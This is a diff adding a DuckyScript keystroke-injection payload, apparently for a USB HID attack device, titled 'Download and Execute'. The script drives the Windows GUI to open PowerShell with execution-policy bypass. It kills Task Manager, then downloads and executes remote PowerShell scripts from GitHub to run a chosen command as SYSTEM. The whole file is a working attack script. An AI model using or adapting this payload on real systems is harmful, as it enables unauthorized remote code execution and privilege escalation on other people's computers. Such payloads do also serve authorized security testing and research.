@@ -1,0 +1,26 @@
+REM --> TITLE Download and Execute
+REM --> AUTHOR m1ddl3w4r3
+REM --> DESCRIPTION Will create a system level powershell process and run the exe provided.
+ATTACKMODE HID VID_0000 PID_0000 MAN_name PROD_name SERIAL_000000000000
+
+REM --> Variable is the thing you want to run as system. (Defaults to whoami for test)
+DEFINE COMMAND_AS_SYSTEM whoami
+DELAY 1000
+GUI x
+DELAY 100
+STRING t
+DELAY 300
+ALT f
+DELAY 100
+n
+DELAY 1000
+STRING powershell -ep bypass
+TAB
+DELAY 300
+SPACE
+DELAY 300
+ENTER
+DELAY 300
+STRING taskkill /IM taskmgr.exe ; "Public/Invoke-CommandAs.ps1", "Private/Invoke-ScheduledTask.ps1" | % { . ([ScriptBlock]::Create((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mkellerman\/Invoke-CommandAs/master/Invoke-CommandAs/${_}")))} ; Invoke-CommandAs -ScriptBlock { COMMAND_AS_SYSTEM } -AsSystem
+ENTER
+CAPSLOCK
